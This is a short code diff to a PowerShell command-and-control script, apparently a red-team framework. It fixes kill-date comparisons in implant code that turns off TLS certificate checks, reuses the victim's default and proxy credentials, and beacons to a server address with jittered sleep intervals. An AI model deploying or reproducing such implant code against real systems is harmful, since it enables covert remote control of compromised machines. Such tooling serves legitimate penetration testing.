@@ -1075,6 +1075,10 @@ netsh http add sslcert ipport=0.0.0.0:443 certhash=REPLACE `"appid={00112233-445
     # call back command
     $command = '[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 function Get-Webclient ($Cookie) {
+$d = (Get-Date -Format "dd/MM/yyyy");
+$d = [datetime]::ParseExact($d,"dd/MM/yyyy",$null);
+$k = [datetime]::ParseExact("'+$killdatefm+'","dd/MM/yyyy",$null);
+if ($k -lt $d) {exit} 
 $wc = New-Object System.Net.WebClient; 
 $wc.UseDefaultCredentials = $true; 
 $wc.Proxy.Credentials = $wc.Credentials;
@@ -1433,9 +1437,9 @@ $ServerClean = $Server
 while($true)
 {
     $date = (Get-Date -Format "dd/MM/yyyy")
+    $date = [datetime]::ParseExact($date,"dd/MM/yyyy",$null)
     $killdate = [datetime]::ParseExact("'+$killdatefm+'","dd/MM/yyyy",$null)
     if ($killdate -lt $date) {exit}
-
     $sleeptimeran = $sleeptime, ($sleeptime * 1.1), ($sleeptime * 0.9)
     $newsleep = $sleeptimeran|get-random
     if ($newsleep -lt 1) {$newsleep = 5} 
@@ -1665,9 +1669,9 @@ $ServerClean = "'+$ipv4address+":"+$serverport+'"
 while($true)
 {
     $date = (Get-Date -Format "dd/MM/yyyy")
+    $date = [datetime]::ParseExact($date,"dd/MM/yyyy",$null)
     $killdate = [datetime]::ParseExact("'+$killdatefm+'","dd/MM/yyyy",$null)
     if ($killdate -lt $date) {exit}
-
     $sleeptimeran = $sleeptime, ($sleeptime * 1.1), ($sleeptime * 0.9)
     $newsleep = $sleeptimeran|get-random
     if ($newsleep -lt 1) {$newsleep = 5} 
